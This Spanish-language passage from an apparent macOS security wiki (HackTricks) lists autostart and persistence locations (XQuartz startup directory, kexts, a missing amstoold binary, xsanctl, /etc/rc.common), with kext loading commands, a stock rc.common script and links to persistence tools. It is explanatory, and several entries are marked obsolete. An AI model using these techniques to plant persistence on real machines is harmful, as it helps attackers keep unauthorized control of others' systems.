Escritura: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Ubicación

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Se requiere root
- **Disparador**: Con XQuartz

#### Descripción y Explotación

XQuartz **ya no está instalado en macOS**, así que si quieres más información, consulta la escritura.

### ~~kext~~

> [!CAUTION]
> Es tan complicado instalar kext incluso como root que no consideraré esto para escapar de sandboxes o incluso para persistencia (a menos que tengas un exploit)

#### Ubicación

Para instalar un KEXT como un elemento de inicio, debe ser **instalado en una de las siguientes ubicaciones**:

- `/System/Library/Extensions`
- Archivos KEXT integrados en el sistema operativo OS X.
- `/Library/Extensions`
- Archivos KEXT instalados por software de terceros

Puedes listar los archivos kext actualmente cargados con:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Para más información sobre [**extensiones del kernel, consulta esta sección**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Escritura: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Ubicación

- **`/usr/local/bin/amstoold`**
- Se requiere root

#### Descripción y explotación

Aparentemente, el `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` estaba utilizando este binario mientras exponía un servicio XPC... el problema es que el binario no existía, así que podrías colocar algo allí y cuando se llame al servicio XPC, se llamará a tu binario.

Ya no puedo encontrar esto en mi macOS.

### ~~xsanctl~~

Escritura: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Ubicación

- **`/Library/Preferences/Xsan/.xsanrc`**
- Se requiere root
- **Disparador**: Cuando se ejecuta el servicio (raramente)

#### Descripción y explotación

Aparentemente, no es muy común ejecutar este script y ni siquiera pude encontrarlo en mi macOS, así que si quieres más información, consulta la escritura.

### ~~/etc/rc.common~~

> [!CAUTION] > **Esto no funciona en versiones modernas de MacOS**

También es posible colocar aquí **comandos que se ejecutarán al inicio.** Ejemplo de un script rc.common regular:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Técnicas y herramientas de persistencia

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
